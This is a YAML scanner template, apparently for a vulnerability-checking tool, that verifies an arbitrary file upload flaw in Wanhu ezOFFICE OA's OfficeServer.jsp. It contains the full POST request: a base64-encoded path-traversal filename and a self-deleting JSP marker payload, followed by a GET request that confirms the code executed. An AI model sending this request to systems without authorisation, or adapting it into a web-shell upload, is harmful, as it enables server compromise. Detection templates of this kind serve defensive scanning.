app: ezoffice
query: app:"ezoffice"
meta:
  name: ezOFFICE-OA-officeserver.jsp文件上传漏洞
  level: 4
  tags:
  - file_upload
  description: 万户OA 除了 /defaultroot/officeserverservlet 接口外的另一处接口 OfficeServer.jsp
    同时也存在任意文件上传漏洞，导致攻击者可上传任意文件获取服务器权限
  homepage: ""
  author: X prism
  references: ""
  solution: 升级至最新版
  create_at: "2024-07-13 13:22:10"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /defaultroot/public/iWebOfficeSign/OfficeServer.jsp
          redirect: true
          header: []
          params: |-
            DBSTEP V3.0     145             0               105             DBSTEP=REJTVEVQ
            OPTION=U0FWRUZJTEU=
            RECORDID=
            isDoc=dHJ1ZQ==
            moduleType=Z292ZG9jdW1lbnQ=
            FILETYPE=Ly8uLi8uLi9wdWJsaWMvZWRpdC83Yzc1QWYuanNw
            <% out.println("5EA635");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: DBSTEP
          type: contains
      - request:
          method: GET
          path: /defaultroot/public/edit/7c75Af.jsp
          redirect: true
          header: []
          params: ""
        response:
        - name: body
          value: 5EA635
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
